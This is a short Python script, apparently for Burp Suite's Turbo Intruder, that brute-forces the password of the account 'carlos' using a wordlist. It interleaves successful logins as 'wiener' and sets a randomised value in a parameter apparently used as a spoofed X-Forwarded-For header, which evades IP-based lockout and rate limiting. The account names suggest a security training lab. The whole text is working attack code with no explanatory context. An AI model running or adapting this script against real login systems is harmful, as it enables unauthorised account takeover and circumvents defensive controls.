from random import randint

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    l = []
    for t in open('/home/kali/Desktop/pass.txt'):
            l.append(t)
    for m in range(1,201):
       if m % 2 == 0:
            XFOR = randint(500,10500)
            engine.queue(target.req, [ XFOR, "wiener", "peter"])
       elif m % 2 != 0:
            XFOR = randint(500,10500)
            i = randint(0,99)
            engine.queue(target.req, [ XFOR, "carlos", l[i] ])

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
